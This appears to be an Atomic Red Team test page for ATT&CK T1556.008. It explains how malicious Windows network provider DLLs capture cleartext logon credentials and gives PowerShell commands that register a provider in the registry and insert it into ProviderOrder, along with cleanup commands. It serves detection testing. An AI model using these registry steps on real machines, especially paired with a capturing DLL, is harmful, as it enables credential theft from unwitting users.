# T1556.008 - Modify Authentication Process: Network Provider DLL

## Description from ATT&CK

> Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) 
> 
> Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)
> 
> Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)

### Atomic Test #1: Register Malicious Network Provider DLL (NPPSPY)

Registers a network provider in the registry the way the NPPSPY credential-theft technique does: it creates HKLM\SYSTEM\CurrentControlSet\Services\<name>\NetworkProvider with a ProviderPath pointing at a DLL, and prepends the provider to HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\ProviderOrder. At the next interactive logon, mpnotify.exe would hand the registered provider cleartext credentials. This test only performs the registry registration (it does not ship a real capturing DLL) so it is safe and reversible; cleanup removes the registry keys. Requires administrative privileges.

**Supported Platforms:** Windows

**auto_generated_guid:** `734ee14f-e1fa-4b39-8462-787780df6e5c`

#### Inputs

| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| provider_name | Name of the network provider service to register | string | AtomicNP|
| dll_path | Path the malicious network provider DLL would be loaded from | path | C:\Windows\Temp\AtomicNPProvider.dll|

#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)

```powershell
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\#{provider_name}\NetworkProvider" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\#{provider_name}\NetworkProvider" -Name "ProviderPath" -Value "#{dll_path}" -PropertyType ExpandString -Force | Out-Null
$order = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER).PROVIDERORDER
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER -Value ("#{provider_name}," + $order)
Write-Host "Registered network provider #{provider_name} -> #{dll_path}"
```

#### Cleanup Commands

```powershell
$order = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER).PROVIDERORDER
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER -Value (($order -split ',' | Where-Object { $_ -ne "#{provider_name}" }) -join ',')
Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\#{provider_name}" -Recurse -Force -ErrorAction Ignore
```
